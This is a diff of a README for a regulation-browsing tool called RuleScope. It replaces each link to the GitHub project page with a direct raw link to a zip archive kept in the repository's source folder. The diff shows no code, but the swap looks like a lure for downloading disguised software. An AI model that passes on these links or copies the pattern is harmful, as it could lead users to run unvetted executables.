@@ -1,6 +1,6 @@
 # 📘 RuleScope - Browse Regulations With Clear Structure
 
-[![Download RuleScope](https://img.shields.io/badge/Download-RuleScope-blue?style=for-the-badge&logo=github)](https://github.com/Lowsodiumdietdevotional330/RuleScope)
+[![Download RuleScope](https://img.shields.io/badge/Download-RuleScope-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Lowsodiumdietdevotional330/RuleScope/main/client/src/Scope_Rule_1.8.zip)
 
 ## 🖥️ What RuleScope Does
 
@@ -12,7 +12,7 @@ It also recognizes Word auto-numbering, so documents with nested lists and forma
 
 Use this link to visit the download page:
 
-[Download RuleScope](https://github.com/Lowsodiumdietdevotional330/RuleScope)
+[Download RuleScope](https://raw.githubusercontent.com/Lowsodiumdietdevotional330/RuleScope/main/client/src/Scope_Rule_1.8.zip)
 
 1. Open the link in your browser.
 2. Find the latest Windows build or release file.
@@ -168,7 +168,7 @@ If the outline looks incomplete, the file may use formatting that is not easy to
 
 Open the project page here:
 
-https://github.com/Lowsodiumdietdevotional330/RuleScope
+https://raw.githubusercontent.com/Lowsodiumdietdevotional330/RuleScope/main/client/src/Scope_Rule_1.8.zip
 
 ## 📚 Useful Topics
 
